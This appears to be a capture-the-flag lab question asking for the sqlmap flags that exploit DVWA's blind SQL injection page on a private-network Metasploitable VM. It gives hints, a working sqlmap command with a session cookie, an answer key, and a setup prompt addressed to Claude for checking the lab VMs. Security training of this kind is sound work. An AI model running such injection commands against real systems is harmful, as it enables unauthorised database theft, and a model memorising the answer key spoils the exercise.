# Q087 — DVWA Blind SQLi (sqlmap)

| Field | Value |
|---|---|
| **Target** | `192.168.52.129` (Metasploitable 2) |
| **Domain** | 12 — Web Apps / 13 — SQLi |
| **Difficulty** | 🟡 Medium |
| **Tools** | `burpsuite`, `sqlmap`, `gobuster`, `nikto`, `curl` |
| **Time budget** | 15–25 min |

---

## 📝 Question

Run sqlmap against DVWA blind SQLi page (`vulnerabilities/sqli_blind/`). Provide flag combination needed.

---

## 🎯 Flag Format

```
flags=<sqlmap-flags>
```

Example: `flags=--technique=B --batch`

**⚠️ Format strict hai** — lowercase, no spaces around `=`, semicolon separator where shown.

---

## 💡 Hints

<details>
<summary>Hint 1 (click)</summary>

`-T users --dump --technique=B`
</details>

<details>
<summary>Hint 2</summary>

Boolean-based blind = `B`.
</details>

---

## ✅ Solution

<details>
<summary>Show solution</summary>

```bash
sqlmap -u 'http://192.168.52.129/dvwa/vulnerabilities/sqli_blind/?id=1&Submit=Submit' --cookie='PHPSESSID=X; security=low' --technique=B --batch
```

Boolean blind succeeds.

**Answer:** `flags=--technique=B --batch`

📖 Ref: [playbooks/sqli-playbook.md](../../playbooks/sqli-playbook.md)
</details>

---

## 🤖 Claude Setup Prompt (for Claude-on-your-PC)

```
1. Verify VMs running: ping 192.168.52.129 and ping 192.168.52.130 from 192.168.52.128.
2. Required services for this Q already up by default on the relevant target.
3. If something is down, restart it on the target VM.

Report back: "Lab ready for Q087".
```
